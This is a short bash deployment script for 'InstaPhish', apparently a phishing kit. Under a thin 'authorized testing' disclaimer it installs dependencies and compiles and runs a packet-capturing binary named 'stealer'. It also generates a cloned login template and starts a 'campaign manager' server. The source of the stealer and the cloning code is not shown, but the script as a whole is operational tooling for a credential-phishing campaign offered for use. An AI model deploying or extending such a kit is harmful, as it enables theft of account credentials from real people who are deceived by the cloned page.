#!/bin/bash
#
# InstaPhish - Deployment Script
# Copyright (c) 2024 r4tur1
# For authorized security testing and educational purposes only.
#

set -e

echo "[+] Updating package lists..."
apt update -qq

echo "[+] Installing system dependencies..."
apt install -y -qq python3 python3-pip clang make openssh-client libpcap-dev libwebsocketpp-dev

BOOST_LIB=$(find /usr/lib -name "libboost_system.so*" 2>/dev/null | head -1)
if [ -z "$BOOST_LIB" ]; then
    echo "[+] Installing Boost system library..."
    apt install -y -qq libboost-system-dev
    BOOST_LIB=$(find /usr/lib -name "libboost_system.so*" 2>/dev/null | head -1)
fi

echo "[+] Installing Python packages..."
pip install --break-system-packages -q -r requirements.txt 2>/dev/null || \
pip install --break-system-packages -q flask requests beautifulsoup4

echo "[+] Compiling inspection engine..."
g++ -std=c++11 -o stealer stealer.cpp -lpcap -lpthread "$BOOST_LIB"
chmod +x stealer

echo "[+] Generating login template..."
python3 clone.py

echo "[+] Starting inspection engine..."
./stealer &
STEALER_PID=$!

echo "[+] Starting campaign manager..."
python3 server.py

kill $STEALER_PID 2>/dev/null